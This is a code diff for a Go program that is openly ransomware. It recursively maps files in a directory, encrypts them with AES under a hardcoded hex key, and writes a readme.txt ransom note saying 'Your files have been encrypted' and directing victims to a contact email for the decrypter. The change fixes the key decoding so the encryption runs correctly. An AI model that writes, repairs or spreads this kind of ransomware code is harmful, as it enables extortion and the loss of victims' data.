@@ -4,6 +4,7 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -19,15 +20,15 @@ var wg sync.WaitGroup
 
 func main() {
 	Encrypted := make(chan []byte, 100)
-	//cryptoKey := "teste" //keygen.Keygen()
-	contact := "" // Insert contact email
+	cryptoKey := "959148601e08d6cc80816964006a15ed54911fd32c3a77f7baaf5d74d4f895c0" //keygen.Keygen()
+	contact := ""                                                                   // Insert contact email
 	//fmt.Println("THIS IS THE KEY:", cryptoKey)
 
-	//key, err := hex.DecodeString(cryptoKey)
-	//if err != nil {
-	//	panic(err)
-	//}
-	key := []byte("959148601e08d6cc80816964006a15ed54911fd32c3a77f7baaf5d74d4f895c0")
+	key, err := hex.DecodeString(cryptoKey)
+	if err != nil {
+		panic(err)
+	}
+
 	//use function mapfiles from explorer (gets every file recursive by decided dir except decrypter!)
 	files := explorer.MapFiles(Dir)
 
@@ -59,7 +60,7 @@ func main() {
 	msg := "Your files have been encrypted.\nContact " + contact + " to get the decrypter/ decrypt key."
 	fmt.Println(msg)
 
-	err := ioutil.WriteFile(root+"/readme.txt", []byte(msg), 0644)
+	err = ioutil.WriteFile(root+"/readme.txt", []byte(msg), 0644)
 	if err != nil {
 		panic(err)
 	}
